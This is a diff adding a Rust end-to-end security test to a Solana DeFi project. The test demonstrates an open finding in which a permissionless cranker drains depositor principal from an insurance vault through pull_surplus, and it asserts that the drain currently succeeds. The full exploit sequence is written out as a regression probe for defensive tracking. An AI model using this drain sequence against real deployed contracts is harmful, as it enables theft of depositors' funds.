@@ -1455,3 +1455,103 @@ fn e2e_attacker_cannot_grant_operator_bypassing_squads() {
     assert!(svm.send_transaction(Transaction::new_signed_with_payer(&[direct2], Some(&payer.pubkey()), &[&payer], bh)).is_err(),
         "only the real asset_admin (Squads vault, via timelock) can drive the grant");
 }
+
+// ATTACK PROBE (finding O, LOF): after the operator handoff to the twap, pull_surplus has
+// NO surplus floor — it is bounded only by percolator's surplus-mode policy (max_bps of
+// insurance), which reserves nothing. So a permissionless cranker can pull DEPOSITOR
+// PRINCIPAL even when there is ZERO surplus. This test DEMONSTRATES the open gap against
+// the real binaries (it asserts the drain SUCCEEDS today); it will flip to a rejection
+// once pull_surplus enforces `amount <= insurance - reserved` (SECURITY_LOG finding O).
+#[test]
+fn e2e_finding_o_cranker_drains_principal_no_floor() {
+    let mut svm = LiteSVM::new().with_compute_budget(solana_program_runtime::compute_budget::ComputeBudget {
+        compute_unit_limit: 1_400_000, heap_size: 256 * 1024,
+        ..solana_program_runtime::compute_budget::ComputeBudget::default()
+    });
+    svm.add_program_from_file(perc_id(), perc_so()).unwrap();
+    svm.add_program_from_file(twap_id(), so_deploy("twap_program")).unwrap();
+    let payer = Keypair::new();
+    svm.airdrop(&payer.pubkey(), 1_000_000_000_000).unwrap();
+    let squads = squads_id();
+    let treasury = install_squads(&mut svm, &squads, &payer.pubkey());
+    let dao = Keypair::new();
+    svm.airdrop(&dao.pubkey(), 1_000_000_000_000).unwrap();
+    let create_key = Keypair::new();
+    let multisig = multisig_pda(&squads, &create_key.pubkey());
+    let create_ix = multisig_create_v2_ix(&squads, &treasury, &multisig, &create_key.pubkey(), &payer.pubkey(),
+        Some(&dao.pubkey()), 1, &[(dao.pubkey(), PERM_ALL)], TIMELOCK_1_WEEK_SECS);
+    let bh = svm.latest_blockhash();
+    svm.send_transaction(Transaction::new_signed_with_payer(&[create_ix], Some(&payer.pubkey()), &[&payer, &create_key], bh)).expect("multisig");
+    let squads_vault = vault_pda(&squads, &multisig, 0);
+
+    let collateral_mint = Pubkey::new_unique();
+    let coin_mint = Pubkey::new_unique();
+    let slab = Pubkey::new_unique();
+    let init_slot = 100u64;
+    let slab_data = make_live_market(&slab, &collateral_mint, &squads_vault, init_slot);
+    svm.set_account(slab, Account { lamports: 1_000_000_000, data: slab_data, owner: perc_id(), executable: false, rent_epoch: 0 }).unwrap();
+    svm.set_sysvar(&Clock { slot: init_slot, unix_timestamp: 100, ..Clock::default() });
+    let vault_authority = perc_vault_authority(&slab, &perc_id());
+    let perc_vault = canonical_insurance_vault(&vault_authority, &collateral_mint);
+    set_token(&mut svm, &perc_vault, &collateral_mint, &vault_authority, 0);
+
+    // twap config for this market.
+    let twap_init = init_config_ix(&payer.pubkey(), &coin_mint, &slab, &multisig, &dao.pubkey(), &perc_id());
+    let bh = svm.latest_blockhash();
+    svm.send_transaction(Transaction::new_signed_with_payer(&[twap_init], Some(&payer.pubkey()), &[&payer], bh)).expect("twap init");
+    let twap_cfg = twap_config_pda(&slab, &multisig, &coin_mint, &perc_id());
+    let twap_authority = Pubkey::find_program_address(&[b"market-0-twap", slab.as_ref()], &twap_id()).0;
+
+    // Fund insurance with PURE PRINCIPAL (no surplus) via a Squads TopUp — squads is the
+    // insurance_authority before the handoff.
+    let principal = 1_000_000u64;
+    let squads_src = Pubkey::new_unique();
+    set_token(&mut svm, &squads_src, &collateral_mint, &squads_vault, principal);
+    let topup_msg = build_topup_message(&squads_vault, &slab, &squads_src, &perc_vault, &perc_id(), principal as u128);
+    let topup_remaining = vec![
+        AccountMeta::new_readonly(squads_vault, false), AccountMeta::new(slab, false), AccountMeta::new(squads_src, false),
+        AccountMeta::new(perc_vault, false), AccountMeta::new_readonly(spl_token::ID, false), AccountMeta::new_readonly(perc_id(), false),
+    ];
+    squads_execute(&mut svm, &squads, &multisig, &dao, &payer, 1, &topup_msg, &topup_remaining).expect("fund insurance (all principal)");
+    assert_eq!(token_amount(&svm, &perc_vault), principal);
+
+    // Handoff: policy -> surplus-mode, operator -> twap.
+    let policy_msg = build_update_insurance_policy_message(&squads_vault, &slab, &perc_id(), 8_000, 0, 100);
+    let policy_remaining = vec![AccountMeta::new_readonly(squads_vault, false), AccountMeta::new(slab, false), AccountMeta::new_readonly(perc_id(), false)];
+    squads_execute(&mut svm, &squads, &multisig, &dao, &payer, 2, &policy_msg, &policy_remaining).expect("policy -> surplus");
+    let op_msg = build_accept_operator_message(&squads_vault, &slab, &twap_cfg, &twap_authority, &perc_id(), &twap_id());
+    let op_remaining = vec![
+        AccountMeta::new_readonly(squads_vault, false), AccountMeta::new(slab, false), AccountMeta::new_readonly(twap_cfg, false),
+        AccountMeta::new_readonly(twap_authority, false), AccountMeta::new_readonly(perc_id(), false), AccountMeta::new_readonly(twap_id(), false),
+    ];
+    squads_execute(&mut svm, &squads, &multisig, &dao, &payer, 3, &op_msg, &op_remaining).expect("operator -> twap");
+
+    // ATTACK: a permissionless cranker pulls 80% of insurance — PURE PRINCIPAL (no surplus
+    // exists). With a surplus floor this must be 0; today it succeeds (finding O).
+    let cranker = Keypair::new();
+    svm.airdrop(&cranker.pubkey(), 1_000_000_000).unwrap();
+    let twap_holding = Pubkey::new_unique();
+    set_token(&mut svm, &twap_holding, &collateral_mint, &twap_authority, 0);
+    let drain = 800_000u64; // 80% of the 1,000,000 principal
+    let mut pd = vec![1u8]; pd.extend_from_slice(&drain.to_le_bytes());
+    let pull = Instruction { program_id: twap_id(), accounts: vec![
+        AccountMeta::new(cranker.pubkey(), true),
+        AccountMeta::new_readonly(twap_cfg, false),
+        AccountMeta::new_readonly(twap_authority, false),
+        AccountMeta::new(slab, false),
+        AccountMeta::new(twap_holding, false),
+        AccountMeta::new(perc_vault, false),
+        AccountMeta::new_readonly(vault_authority, false),
+        AccountMeta::new_readonly(perc_id(), false),
+        AccountMeta::new_readonly(spl_token::ID, false),
+    ], data: pd };
+    svm.expire_blockhash();
+    let bh = svm.latest_blockhash();
+    let r = svm.send_transaction(Transaction::new_signed_with_payer(&[pull], Some(&payer.pubkey()), &[&payer, &cranker], bh));
+
+    // KNOWN-OPEN (finding O): the drain currently SUCCEEDS — depositor principal is pulled
+    // with no surplus present. When the surplus floor lands, change this to assert it FAILS.
+    assert!(r.is_ok(), "finding O: pull_surplus has no floor — principal drained ({:?})", r.err());
+    assert_eq!(token_amount(&svm, &twap_holding), drain, "principal drained into twap holding");
+    assert_eq!(token_amount(&svm, &perc_vault), principal - drain, "insurance principal reduced by the drain");
+}
